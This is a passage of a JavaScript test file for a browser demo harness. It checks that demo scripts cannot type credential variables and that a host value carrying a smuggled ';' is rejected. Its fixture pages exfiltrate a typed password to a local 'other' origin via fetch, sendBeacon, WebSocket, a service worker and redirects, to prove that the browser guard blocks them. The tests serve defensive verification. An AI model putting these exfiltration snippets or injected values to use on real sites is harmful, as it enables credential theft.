  const parts = { serve: { command: 'node app/server.cjs', url: 'http://127.0.0.1:9/',
    cwd: here.dir }, scripts: [script('scenario-1', setup)] };
  assert.throws(() => run(here, parts, { browsers: [process.execPath],
    env: { QORY_HARNESS_HOME: home(['ACME_*']) } }), (error) => {
    assert.equal(error.message, 'Remove the key from the demo scripts, then run preflight again.');
    assert.deepEqual(error.more, ['A setup types ACME_HOST, a variable of the run\'s credential ' +
      'list.']);
    return true;
  });
  assert.throws(() => run(here, parts, { browsers: [process.execPath],
    env: { QORY_HARNESS_HOME: home(['ACME_*', '*']) } }), (error) => {
    assert.equal(error.message, 'Fix qory.credential_variables in inputs.json.');
    assert.deepEqual(error.more, ['"*" is no variable name or prefix.']);
    return true;
  });
  assert.equal(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')), false);
});

test('preflight: a demo script that types a key of qory, of an agent or of a code forge exits 3 before the app starts', async () => {
  const { runKey } = require(path.join(SKILL, 'lib/secrets.cjs'));
  assert.deepEqual(['QORY_RUN_KEY', 'ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN',
    'GITHUB_TOKEN', 'GH_TOKEN', 'GITLAB_TOKEN', 'GL_TOKEN', 'BITBUCKET_TOKEN',
    'GH_ENTERPRISE_TOKEN', 'GITHUB_ENTERPRISE_TOKEN', 'DEMO_PASSWORD', 'APP_TOKEN',
    'GITLAB_TOKEN_FILE', 'MY_GL_TOKEN'].map(runKey),
  [true, true, true, true, true, true, true, true, true, true, false, false, false, false]);
  const here = checkout();
  const setup = [...SIGN_IN.slice(0, 2), { do: 'type', target: '#password',
    variable: 'ANTHROPIC_API_KEY' }];
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: 'http://127.0.0.1:9/', cwd: here.dir }, scripts: [script('scenario-1', setup)] },
  { browsers: [process.execPath] }), (error) => {
    assert.equal(error.message, 'Remove the key from the demo scripts, then run preflight again.');
    assert.deepEqual(error.more, ['A setup types ANTHROPIC_API_KEY, a variable of the run\'s ' +
      'credential list.']);
    return true;
  });
  assert.equal(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')), false);
});

// pinnedPlan writes a folder of pulled artifacts with index.json and version 1 of a build plan
// whose Summary has the lines of summary and whose serve command is command, and returns it.
function pinnedPlan(summary, command) {
  const dir = path.join(tmp, `pinned-${++folders}`);
  const plan = path.join(dir, 'build-plan', 'main', 'v1');
  fs.mkdirSync(plan, { recursive: true });
  fs.writeFileSync(path.join(dir, 'index.json'), JSON.stringify({ artifacts: [{
    type: 'build-plan', name: 'main', approved_version: null, newest_version: 1,
    versions: [{ id: 'av_bp1', number: 1 }] }] }));
  fs.writeFileSync(path.join(plan, 'build-plan.md'), ['## Summary', '', 'One deliverable.',
    '', ...summary, '', '## Deliverables', '', '| Id | Change | Criteria | Files | Check |',
    '|---|---|---|---|---|', '| d-1 | Add the date. | ac-1 | `src/a.js` | scenario-1 |', '',
    '## Commands', '', '| Kind | Command | Result file | Source |', '|---|---|---|---|',
    '| targeted | `node --test` | `out/junit.xml` | repository: `package.json` |',
    `| serve | \`${command}\` | none | repository: \`package.json\` |`, ''].join('\n'));
  return dir;
}

// demoScript writes version 1 of the demo script of scenario-1, with setup, to root, and an
// index.json that lists it.
function demoScript(root, setup = SIGN_IN) {
  const dir = path.join(root, 'demo-script', 'scenario-1', 'v1');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'scenario-1.json'), JSON.stringify(script('scenario-1', setup)));
  fs.writeFileSync(path.join(root, 'index.json'),
    JSON.stringify({ artifacts: [entry('scenario-1', [[1]])] }));
}

test('preflight verb: with the app stopped, the session ends escalate, and the point has its fix', async () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const port = await freePort();
  const command = 'node app/missing.cjs';
  const pinned = pinnedPlan([`App address: \`http://127.0.0.1:${port}/\``], command);
  // The demo scripts come from the artifact folder of the session, not from the folder of
  // the build plans.
  demoScript(here.root);
  const deps = { cwd: here.dir, artifacts: [here.root],
    preflight: { browsers: [process.execPath], startMs: 5000 } };
  const done = call(['preflight', '--artifacts', pinned], deps);
  assert.equal(done.status, 1, done.out + done.err);
  const lines = done.out.trim().split('\n');
  assert.equal(lines[0], 'End the session with points.json: the app did not start in the dev ' +
    'container.');
  assert.equal(lines.at(-1), 'Checked the browser and the app: 1 of 2 parts is missing, and ' +
    'points.json has a point run_again for each.');
  // The point contains the missing part, and its fix line has the step to take.
  const file = path.join(here.root, 'points.json');
  const [point] = points(here.root);
  assert.equal(point.text, P02_TEXT);
  assert.equal(point.fix, `Make ${command} start the app in the dev container, then run ` +
    'another round.');
  assert.ok(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')));
  // Nothing goes to the folder of the pulled artifacts.
  assert.equal(fs.existsSync(path.join(pinned, 'points.json')), false);
  assert.equal(call(['check', 'points', file], { cwd: here.dir }).status, 0);
  const { args, env } = stub();
  const ended = call(['end', here.root], { env });
  assert.equal(ended.status, 0, ended.out + ended.err);
  assert.deepEqual(fs.readFileSync(args, 'utf8').split('\n')
    .filter((line) => line.startsWith('run verdict')), [`run verdict escalate --points ${file}`]);
});

test('demo run: a script that passes prints its sha256, and a step that fails gets its fix',
  { skip: NO_BROWSER }, async () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const port = await freePort();
  const pinned = pinnedPlan([`App address: \`http://127.0.0.1:${port}/\``], 'node app/server.cjs');
  const env = { ...process.env, APP_PORT: String(port), APP_SECRET: 'parcel-blue-41',
    QORY_HARNESS_HOME: APP_HOME,
    DEMO_PASSWORD: 'parcel-blue-41' };
  const deps = { cwd: here.dir, artifacts: [here.root], env, preflight: { browsers: [BROWSER],
    startMs: 10000, actionMs: 3000, signedInMs: 3000, browserMs: BROWSER_MS } };
  const draft = (actions) => {
    const one = script('scenario-1', SIGN_IN);
    one.steps[0].actions = actions;
    fs.mkdirSync(path.join(here.root, '.demo'), { recursive: true });
    fs.writeFileSync(path.join(here.root, '.demo', 'scenario-1.json'), JSON.stringify(one));
    return fs.readFileSync(path.join(here.root, '.demo', 'scenario-1.json'), 'utf8');
  };
  const text = draft([{ do: 'wait', text: 'Order 1042' }]);
  const done = call(['demo', 'run', 'scenario-1', '--artifacts', pinned], deps);
  assert.equal(done.status, 0, done.out + done.err);
  assert.equal(done.out.trim(), 'Ran scenario-1 with video off: 1 step passed. The sha256 of ' +
    `.demo/scenario-1.json is ${crypto.createHash('sha256').update(text).digest('hex')}.`);
  draft([{ do: 'click', target: '#nothing' }]);
  const failed = call(['demo', 'run', 'scenario-1', '--artifacts', pinned], deps);
  assert.equal(failed.status, 1, failed.out + failed.err);
  const lines = failed.out.trim().split('\n');
  assert.equal(lines[0], 'Fix step 1 in .demo/scenario-1.actions.json, then run demo write ' +
    'scenario-1.');
  assert.match(lines[1], /^ {2}action 1 \(click #nothing\) failed: /);
  assert.equal(lines.at(-1), 'Ran scenario-1 with video off: it failed in step 1.');
  // A sign-in that fails is the setup.
  const one = script('scenario-1', [{ do: 'open', url: '/missing-page' },
    { do: 'click', target: '#nothing' }]);
  fs.writeFileSync(path.join(here.root, '.demo', 'scenario-1.json'), JSON.stringify(one));
  const setup = call(['demo', 'run', 'scenario-1', '--artifacts', pinned], deps);
  assert.equal(setup.status, 1, setup.out + setup.err);
  assert.equal(setup.out.trim().split('\n')[0],
    'Fix the setup in .demo/scenario-1.actions.json, then run demo write scenario-1.');
});

test('preflight verb: a draft script that breaks its schema exits 3 with the cause', async () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const port = await freePort();
  const pinned = pinnedPlan([`App address: \`http://127.0.0.1:${port}/\``], 'node app/server.cjs');
  demoScript(here.root);
  fs.mkdirSync(path.join(here.root, '.demo'), { recursive: true });
  fs.writeFileSync(path.join(here.root, '.demo', 'scenario-1.json'), '{"scenario":"scenario-1"}');
  const done = call(['preflight', '--artifacts', pinned], { cwd: here.dir, artifacts: [here.root],
    preflight: { browsers: [process.execPath], startMs: 1000 } });
  assert.equal(done.status, 3, done.out + done.err);
  const lines = done.out.trim().split('\n');
  assert.match(lines[0], /^Run demo write scenario-1 again\./);
  assert.ok(lines.some((line) => line.trim() === 'Cause: a demo script breaks its format rules.'),
    done.out);
});

test('preflight verb: each input that is missing or broken, and a runner with no result, exit 3 with their causes, and bad arguments exit 2', () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const deps = { cwd: here.dir, artifacts: [here.root],
    preflight: { browsers: [process.execPath], startMs: 1000 } };
  // causeOf returns the cause of the output of an exit 3.
  const causeOf = (out) => out.split('\n').find((line) => /^ *Cause: /.test(line)).trim();
  const done = call(['preflight', '--artifacts', pinnedPlan([], 'npm run dev')], deps);
  assert.equal(done.status, 3, done.out + done.err);
  assert.equal(done.out.split('\n')[0], 'Add the line "App address: <url>" to ## Summary of the ' +
    'build plan, then push it.');
  assert.equal(causeOf(done.out), 'Cause: the build plan has no App address.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // A host with a ; would add an entry to --proxy-bypass-list of the browser.
  const host = call(['preflight', '--artifacts',
    pinnedPlan(['App address: `http://127.0.0.1;example.com:8080/`'], 'npm run dev')], deps);
  assert.equal(host.status, 3, host.out + host.err);
  assert.equal(host.out.split('\n')[0], 'Set the App address host to letters, digits, . and -, ' +
    'then push the build plan.');
  assert.ok(host.out.includes('The App address of version 1 is ' +
    '"`http://127.0.0.1;example.com:8080/`", whose host is not letters, digits, . and -'),
  host.out);
  assert.equal(causeOf(host.out), 'Cause: the App address of the build plan has a host other ' +
    'than letters, digits, . and -.');
  // A serve command with no demo script in the artifact folder of the session.
  const address = ['App address: `http://127.0.0.1:9/`'];
  const none = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(none.status, 3, none.out + none.err);
  assert.equal(none.out.split('\n')[0], 'Run `qory artifact pull demo-script`, then run ' +
    'preflight again.');
  assert.equal(causeOf(none.out), 'Cause: no demo script exists for the app.');
  // A demo script that types a key of qory, of an agent or of a code forge.
  demoScript(here.root, [...SIGN_IN.slice(0, 2), { do: 'type', target: '#password',
    variable: 'QORY_RUN_KEY' }]);
  const key = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(key.status, 3, key.out + key.err);
  assert.equal(key.out, 'Remove the key from the demo scripts, then run preflight again.\n' +
    '  A setup types QORY_RUN_KEY, a variable of the run\'s credential list.\n' +
    'Checked nothing: the preflight could not read its input.\n');
  assert.equal(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')), false);
  demoScript(here.root);
  // A runner of the app that prints no result, here a node that cannot start, exits 3, with
  // no point.
  const fault = call(['preflight', '--artifacts', pinnedPlan(
    ['App address: `http://127.0.0.1:9/`'], 'node app/server.cjs')],
  { ...deps, env: { ...process.env, NODE_OPTIONS: `--require ${path.join(tmp, 'none.cjs')}` } });
  assert.equal(fault.status, 3, fault.out + fault.err);
  assert.equal(fault.out.split('\n')[0], 'End the run: the check of the app and the sign-in did ' +
    'not finish.');
  assert.equal(causeOf(fault.out), 'Cause: the browser check did not finish: the runner exited ' +
    'with 1.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // A folder of pulled artifacts whose index.json lists no build plan.
  const empty = path.join(tmp, `pinned-${++folders}`);
  fs.mkdirSync(empty);
  fs.writeFileSync(path.join(empty, 'index.json'), JSON.stringify({ artifacts: [] }));
  const noPlan = call(['preflight', '--artifacts', empty], deps);
  assert.equal(noPlan.status, 3, noPlan.out + noPlan.err);
  assert.equal(noPlan.out.split('\n')[0], 'Push the build plan, then pull the artifacts: ' +
    'index.json lists no version of build-plan.');
  assert.equal(causeOf(noPlan.out), 'Cause: the build plan is missing.');
  // A demo script that is no JSON, and one that breaks its schema.
  const scriptFile = path.join(here.root, 'demo-script', 'scenario-1', 'v1', 'scenario-1.json');
  for (const [text, first] of [
    ['{ "scenario":', 'Write demo-script scenario-1 version 1 as valid JSON.'],
    [JSON.stringify({ scenario: 'scenario-1' }), 'Push a demo script of scenario-1 that ' +
      'passes its check, then pull it.']]) {
    fs.writeFileSync(scriptFile, text);
    const broken = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
      deps);
    assert.equal(broken.status, 3, broken.out + broken.err);
    assert.equal(broken.out.split('\n')[0], first);
    assert.equal(causeOf(broken.out), 'Cause: a demo script breaks its format rules.');
  }
  // index.json counts version 2, and the store has no folder of it; then a folder of version 1
  // with no file of the script.
  demoScript(here.root);
  fs.writeFileSync(path.join(here.root, 'index.json'),
    JSON.stringify({ artifacts: [entry('scenario-1', [[1], [2]])] }));
  const lacking = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(lacking.status, 3, lacking.out + lacking.err);
  assert.equal(lacking.out.split('\n')[0], 'Run `qory artifact pull demo-script --version 2`, ' +
    'then check again.');
  assert.equal(causeOf(lacking.out), 'Cause: the run could not read version 2 of a demo script.');
  demoScript(here.root);
  fs.rmSync(scriptFile);
  const noFile = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(noFile.status, 3, noFile.out + noFile.err);
  assert.equal(noFile.out.split('\n')[0], 'Pull the artifacts again.');
  assert.equal(causeOf(noFile.out), 'Cause: the run could not read version 1 of a demo script.');
  for (const argv of [['preflight', '--artifacts'], ['preflight', 'now'],
    ['preflight', '--inputs']]) {
    assert.equal(call(argv, deps).status, 2, argv.join(' '));
  }
});

test('preflight verb: an empty qory.start_artifacts reads the build plan of the session', () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const inputs = path.join(here.dir, 'inputs.json');
  fs.writeFileSync(inputs, JSON.stringify({ qory: { harness_extensions: {}, start_commits: [],
    start_artifacts: '' } }));
  // The plan of the session folder has no App address, so preflight exits 3 on it.
  const done = call(['preflight', '--inputs', inputs], { cwd: here.dir,
    artifacts: [pinnedPlan([], 'npm run dev')],
    preflight: { browsers: [process.execPath], startMs: 1000 } });
  assert.equal(done.status, 3, done.out + done.err);
  assert.equal(done.out.split('\n')[0], 'Add the line "App address: <url>" to ## Summary of the ' +
    'build plan, then push it.');
});

// The pages of the guard tests, each with a sign-in form whose submit sends the password to
// the origin other: a form or window.open in a new window, fetch, sendBeacon, an image, a
// WebSocket, a service worker of the app that sends each form it gets there, a script that
// opens an address there, or a form that posts there. /meta refreshes to other at its load,
// /object shows a page of other in an object, and /blank-frame a field in a frame.
function guardPages(other, otherHost) {
  const page = (body) => `<!doctype html><html><body>${body}</body></html>`;
  const form = (attrs) => `<form id="f" ${attrs}><input id="password" name="password">` +
    '<button id="go" type="submit">Sign in</button></form>';
  const send = (code) => form(`onsubmit="event.preventDefault();const v=password.value;${code};` +
    'location.href=\'/orders\'"');
  return {
    '/popup-form': page(form(`method="post" action="${other}/popup-form" target="_blank"`)),
    '/popup-open': page(form('onsubmit="event.preventDefault();' +
      `window.open('${other}/popup-open?v='+password.value)"`)),
    '/fetch': page(send(`fetch('${other}/fetch',{method:'POST',body:v,mode:'no-cors'})`)),
    '/beacon': page(send(`navigator.sendBeacon('${other}/beacon',v)`)),
    '/image': page(send(`new Image().src='${other}/img?v='+v`)),
    '/socket': page(send(`new WebSocket('ws://${otherHost}/ws?v='+v)`)),
    '/worker': page(`<p id="s">wait</p>${form('method="post" action="/session"')}` +
      '<script>navigator.serviceWorker.register("/sw.js").then(() => ' +
      'navigator.serviceWorker.ready).then(() => { if (navigator.serviceWorker.controller) ' +
      'document.getElementById("s").textContent = "worker-ready"; else location.reload(); })' +
      '</script>'),
    '/sw.js': 'self.addEventListener("install", () => self.skipWaiting());\n' +
      'self.addEventListener("activate", (e) => e.waitUntil(clients.claim()));\n' +
      'self.addEventListener("fetch", (e) => { if (e.request.method !== "POST") return;\n' +
      '  e.respondWith(e.request.clone().text().then((body) => fetch(' +
      `"${other}/worker", { method: "POST", body, mode: "no-cors" }).catch(() => {}))\n` +
      '    .then(() => new Response("<h1>Order 1042</h1>", ' +
      '{ headers: { "content-type": "text/html" } }))); });\n',
    '/script-nav': page(form('onsubmit="event.preventDefault();' +
      `location.href='${other}/nav?v='+password.value"`)),
    '/post': page(form(`method="post" action="${other}/post"`)),
    '/meta': '<!doctype html><html><head><meta http-equiv="refresh" ' +
      `content="0;url=${other}/meta"></head><body>${form('method="post" action="/session"')}</body></html>`,
    '/object': page(`<object id="ob" data="${other}/object" type="text/html" width="400" ` +
      `height="120"></object>${form('method="post" action="/session"')}`),
    '/blank-frame': page('<iframe id="fr" src="about:blank"></iframe>' +
      `${form('method="post" action="/session"')}<script>document.getElementById("fr")` +
      '.contentDocument.body.innerHTML = "<input id=inner>";</script>'),
    '/orders': page('<h1>Order 1042</h1>'),
  };
}

// The result of the sign-in of each guard page: outside, a fail with the origin of the
// other server; pass, a sign-in that passes, since the request fails and the app shows its
// orders; or frame, a fail at a type into a frame. type is the target of the type action.
const GUARD_CASES = {
  'popup-form': { result: 'outside' }, 'popup-open': { result: 'outside' },
  fetch: { result: 'pass' }, beacon: { result: 'pass' }, image: { result: 'pass' },
  socket: { result: 'pass' }, worker: { result: 'pass' },
  'script-nav': { result: 'outside' }, post: { result: 'outside' },
  meta: { result: 'outside' }, object: { result: 'outside', type: '#ob' },
  'blank-frame': { result: 'frame', type: '#fr' },
};

// listen starts an http server with handler on host, and resolves to it and its port.
function listen(handler, host) {
  return new Promise((resolve) => {
    const server = http.createServer(handler);
    server.listen(0, host, () => resolve({ server, port: server.address().port }));
  });
}

// guard replays the sign-in of each of cases on the guard pages of an app on appHost, and
// asserts that the server of another origin on 127.0.0.1 gets no request, that each new
// window closes and writes its origin to outside, and that no page outside the tab remains.
async function guard(appHost, cases) {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const got = [];
  const other = await listen((req, res) => {
    got.push(`${req.method} ${req.url}`);
    res.end('other');
  }, '127.0.0.1');
  other.server.on('upgrade', (req, socket) => {
    got.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  const otherOrigin = `http://127.0.0.1:${other.port}`;
  const pages = guardPages(otherOrigin, `127.0.0.1:${other.port}`);
  const app = await listen((req, res) => {
    req.resume();
    const at = req.url.split('?')[0];
    if (req.method === 'POST') {
      res.writeHead(303, { Location: '/orders' });
      res.end();
      return;
    }
    res.writeHead(200, { 'content-type': at.endsWith('.js') ? 'text/javascript'
      : 'text/html' });
    res.end(pages[at] || pages['/orders']);
  }, appHost);
  const base = `http://${appHost}:${app.port}/`;
  const origin = new URL(base).origin;
  const browser = new Browser(BROWSER, { origin });
  try {
    await browser.start(BROWSER_MS);
    for (const name of cases) {
      got.length = 0;
      const page = await browser.page({ origin });
      const actions = [{ do: 'open', url: `/${name}` },
        ...(name === 'worker' ? [{ do: 'wait', text: 'worker-ready', timeout_ms: 8000 }] : []),
        { do: 'type', target: GUARD_CASES[name].type || '#password',
          variable: 'DEMO_PASSWORD' },
        ...(GUARD_CASES[name].type ? [] : [{ do: 'click', target: '#go' }])];
      const done = await replay.signIn(page, actions,
        { base, env: { DEMO_PASSWORD: 'parcel-blue-41' }, signedInMs: 2000 });
      await new Promise((resolve) => { setTimeout(resolve, 1000); });
      const { targetInfos } = await browser.send('Target.getTargets');
      const left = targetInfos.filter((one) => one.browserContextId === page.browserContextId &&
        one.type === 'page');
      await page.close();
      assert.deepEqual(got, [], name);
      assert.deepEqual(left.map((one) => one.targetId), [page.targetId], name);
      const { result } = GUARD_CASES[name];
      if (result === 'outside') {
        assert.equal(done.ok, false, name);
        assert.equal(done.outside, otherOrigin, name);
        assert.match(done.why, new RegExp(`the page opened ${otherOrigin}, outside the app`),
          name);
      } else if (result === 'frame') {
        assert.deepEqual(done, { ok: false, outside: null,
          why: 'action 2 (type into #fr) failed: the focus is in a frame' }, name);
      } else {
        assert.equal(done.ok, true, `${name}: ${done.why}`);
      }
    }
  } finally {
    await browser.stop();
    app.server.close();
    other.server.close();
  }
}

test('preflight: no request of the sign-in reaches another origin, and a new window closes', { skip: NO_BROWSER }, async () => {
  await guard('127.0.0.1', Object.keys(GUARD_CASES));
});

// The first IPv4 address of this machine that is not loopback, or null for none.
const LAN = Object.values(os.networkInterfaces()).flat()
  .find((one) => one && one.family === 'IPv4' && !one.internal);
const NO_LAN = NO_BROWSER || (!LAN && 'this machine has no address other than loopback');

test('preflight: the guard works for an app whose host is not loopback', { skip: NO_LAN }, async () => {
  // A service worker needs a secure origin, and http on such a host is none.
  await guard(LAN.address, Object.keys(GUARD_CASES).filter((name) => name !== 'worker'));
});

// reachOut starts an app on 127.0.0.1 whose page /out runs code, then shows the text that
// code resolves to, and replays a sign-in that waits for that text in a Browser of bin with
// the origin of the app. It resolves to the text, or to the reason of a failed sign-in.
async function reachOut(bin, code) {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const app = await listen((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<!doctype html><html><body><p id="s">wait</p><script>' +
      `(${code})().then((text) => { document.getElementById("s").textContent = text; })` +
      '</script></body></html>');
  }, '127.0.0.1');
  const base = `http://127.0.0.1:${app.port}/`;
  const origin = new URL(base).origin;
  const browser = new Browser(bin, { origin });
  try {
    await browser.start(BROWSER_MS);
    const page = await browser.page({ origin });
    const done = await replay.signIn(page, [{ do: 'open', url: '/out' },
      { do: 'wait', text: 'done', timeout_ms: 10000 }], { base, env: {} });
    const text = done.ok ? (await page.send('Runtime.evaluate', { expression:
      'document.getElementById("s").textContent', returnByValue: true })).result.value : done.why;
    await page.close();
    return text;
  } finally {
    await browser.stop();
    app.server.close();
  }
}

// stripped returns a browser that runs BROWSER without each flag that starts with one of
// prefixes, and with the flags of more, so that a control shows what the guard of a flag
// stops.
function stripped(prefixes, more = []) {
  const drop = prefixes.length ? `for one do shift; case "$one" in ` +
    `${prefixes.map((one) => `${one}*`).join('|')}) ;; *) set -- "$@" "$one" ;; esac; done\n`
    : '';
  return fakeBrowser(checkout(), `${drop}exec '${BROWSER}' ${more.join(' ')} "$@"`).file;
}

// The flag of the guard that sends each request of the page outside the app to the dead
// proxy, which also stops a TURN connection over TCP and a QUIC packet.
const PROXY = ['--proxy-server='];

// heard starts a listener of kind udp or tcp on 127.0.0.1 and resolves to { text, count }:
// the text of reachOut for the browser that bin(port) returns and the code that code(port)
// returns, and the number of UDP packets or TCP connections that the listener got.
async function heard(kind, bin, code) {
  let count = 0;
  let listener;
  if (kind === 'udp') {
    listener = dgram.createSocket('udp4');
    listener.on('message', () => { count += 1; });
    await new Promise((resolve) => { listener.bind(0, '127.0.0.1', resolve); });
  } else {
    listener = net.createServer((socket) => {
      count += 1;
      socket.destroy();
    });
    await new Promise((resolve) => { listener.listen(0, '127.0.0.1', resolve); });
  }
  const { port } = listener.address();
  try {
    const text = await reachOut(bin(port), code(port));
    return { text, count };
  } finally {
    listener.close();
  }
}

// gather returns the code of a page that gathers the candidates of a WebRTC connection with
// iceServer for 3 s.
const gather = (iceServer, more = '') => `async () => {
  const connection = new RTCPeerConnection({ iceServers: [${iceServer}]${more} });
  connection.createDataChannel('demo');
  await connection.setLocalDescription(await connection.createOffer());
  await new Promise((resolve) => { setTimeout(resolve, 3000); });
  connection.close();
  return 'done';
}`;

test('preflight: a WebRTC connection of a page sends no UDP packet to a STUN server', { skip: NO_BROWSER }, async () => {
  const stun = (port) => gather(`{ urls: 'stun:127.0.0.1:${port}' }`);
  // The control: without --webrtc-ip-handling-policy, Chrome 157 on macOS and Chromium 153 on
  // Linux send 4 STUN requests to the server within the 3 s.
  const control = await heard('udp', () => stripped(['--webrtc-ip-handling-policy=']), stun);
  assert.equal(control.text, 'done');
  assert.ok(control.count > 0, 'the control sent no STUN request');
  const guarded = await heard('udp', () => BROWSER, stun);
  assert.deepEqual(guarded, { text: 'done', count: 0 });
});

test('preflight: a WebRTC connection of a page opens no TCP connection to a TURN server', { skip: NO_BROWSER }, async () => {
  const turn = (port) => gather(`{ urls: 'turn:127.0.0.1:${port}?transport=tcp', ` +
    "username: 'demo', credential: 'demo-pass' }", ", iceTransportPolicy: 'relay'");
  // The control: without --proxy-server, the browser connects to the TURN server.
  const control = await heard('tcp', () => stripped(PROXY), turn);
  assert.equal(control.text, 'done');
  assert.ok(control.count > 0, 'the control opened no connection to the TURN server');
  const guarded = await heard('tcp', () => BROWSER, turn);
  assert.deepEqual(guarded, { text: 'done', count: 0 });
});

test('preflight: WebTransport and HTTP/3 of a page send no QUIC packet', { skip: NO_BROWSER }, async () => {
  // A WebTransport session, which runs over HTTP/3, sends QUIC packets to the server.
  const session = (port) => `async () => {
    const session = new WebTransport('https://127.0.0.1:${port}/');
    await Promise.race([session.ready.catch(() => {}),
      new Promise((resolve) => { setTimeout(resolve, 3000); })]);
    try { session.close(); } catch {}
    return 'done';
  }`;
  // A fetch uses HTTP/3 only after a response of the origin offers it, which the proxy stops;
  // --origin-to-force-quic-on makes the browser use HTTP/3 at once, as after such a response.
  const fetched = (port) => `async () => fetch('https://127.0.0.1:${port}/', ` +
    "{ mode: 'no-cors' }).then(() => 'done', () => 'done')";
  const quic = (port) => `--origin-to-force-quic-on=127.0.0.1:${port}`;
  // The controls: without --proxy-server, the browser sends QUIC packets to the server.
  const controls = [await heard('udp', () => stripped(PROXY), session),
    await heard('udp', (port) => stripped(PROXY, [quic(port)]), fetched)];
  for (const control of controls) {
    assert.equal(control.text, 'done');
    assert.ok(control.count > 0, 'the control sent no QUIC packet');
  }
  assert.deepEqual(await heard('udp', () => BROWSER, session), { text: 'done', count: 0 });
  assert.deepEqual(await heard('udp', (port) => stripped([], [quic(port)]), fetched),
    { text: 'done', count: 0 });
});

test('preflight: a page cannot look up another host name', { skip: NO_BROWSER }, async () => {
  const got = [];
  const other = await listen((req, res) => {
    got.push(`${req.headers.host.split(':')[0]} ${req.url}`);
    res.end('other');
  }, '127.0.0.1');
  const reach = (host) => `fetch('http://${host}:${other.port}/' + '${host}', ` +
    "{ mode: 'no-cors' }).then(() => 'reached', () => 'failed')";
  const code = `async () => [await ${reach('localhost')}, await ${reach('127.0.0.1')}, ` +
    "'done'].join(' ')";
  const proxy = ['--proxy-server=', '--proxy-bypass-list='];
  try {
    // The control: with no proxy flags and no --host-resolver-rules, both requests reach the
    // other server.
    assert.equal(await reachOut(stripped([...proxy, '--host-resolver-rules=']), code),
      'reached reached done');
    assert.deepEqual(got, ['localhost /localhost', '127.0.0.1 /127.0.0.1']);
    got.length = 0;
    // With no proxy flags, only the lookup of the name stops the request, and the request to
    // the address of 127.0.0.1 reaches the other server.
    assert.equal(await reachOut(stripped(proxy), code), 'failed reached done');
    assert.deepEqual(got, ['127.0.0.1 /127.0.0.1']);
  } finally {
    other.server.close();
  }
});

// ---- film: the film or the pictures of a scenario, and the pictures of pages -----------------

const { capture } = require(path.join(SKILL, 'lib/capture.cjs'));
const filmVerb = require(path.join(SKILL, 'verbs/film.cjs'));

// pushed writes the demo scripts of scripts into root as version 1 of each, and index.json.
function pushed(root, scripts) {
  for (const one of scripts) {
    const dir = path.join(root, 'demo-script', one.scenario, 'v1');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, `${one.scenario}.json`), JSON.stringify(one));
  }
  fs.writeFileSync(path.join(root, 'index.json'), JSON.stringify({ artifacts: scripts
    .map((one) => entry(one.scenario, [[1]])) }));
}

// scenario returns a demo script that signs in, with the evidence and the steps of the
// actions in lists.
const scenario = (id, evidence, ...lists) => ({ ...script(id, SIGN_IN), evidence,
  steps: lists.map((actions, at) => ({ step: at + 1, title: `Step ${at + 1} of ${id}.`,
    expected: 'Seen.', actions })) });

const CLOCK = [[{ do: 'open', url: '/clock' }, { do: 'wait', text: 'Start' }],
  [{ do: 'wait', text: 'Done', timeout_ms: 5000 }]];
const ORDERS = [[{ do: 'open', url: '/orders' }, { do: 'wait', text: 'Order 1042' }]];

// filming returns a checkout with the pushed scripts and the dependencies of call, for a build
// plan with the serve row of the app.
async function filming(scripts) {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  pushed(here.root, scripts);
  const port = await freePort();
  const plan = pinnedPlan([`App address: \`http://127.0.0.1:${port}/\``], 'node app/server.cjs');
  const env = { ...process.env, APP_PORT: String(port), APP_SECRET: 'parcel-blue-41',
    QORY_HARNESS_HOME: APP_HOME,
    DEMO_PASSWORD: 'parcel-blue-41' };
  const deps = { cwd: here.dir, artifacts: [here.root], env, preflight: { browsers: [BROWSER],
    startMs: 10000, actionMs: 3000, signedInMs: 3000, browserMs: BROWSER_MS } };
  return { ...here, plan, deps };
}

// probe returns the width, height and duration in seconds of the film file.
function probe(file) {
  const got = childProcess.spawnSync(FFPROBE, ['-v', 'error', '-show_entries',
    'stream=width,height:format=duration', '-of', 'json', file], { encoding: 'utf8' });
  const data = JSON.parse(got.stdout);
  return { width: data.streams[0].width, height: data.streams[0].height,
    seconds: Number(data.format.duration) };
}

test('film: two film scenarios make two films, and a pictures scenario one picture per step', { skip: NO_FILM }, async () => {
  const here = await filming([scenario('scenario-1', 'film', ...CLOCK),
    scenario('scenario-2', 'film', ...ORDERS),
    scenario('scenario-3', 'pictures', ...ORDERS, [{ do: 'wait', text: 'Order 1042' }])]);
  const film = path.join(here.root, '.film');
  const one = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
  assert.equal(one.status, 0, one.out + one.err);
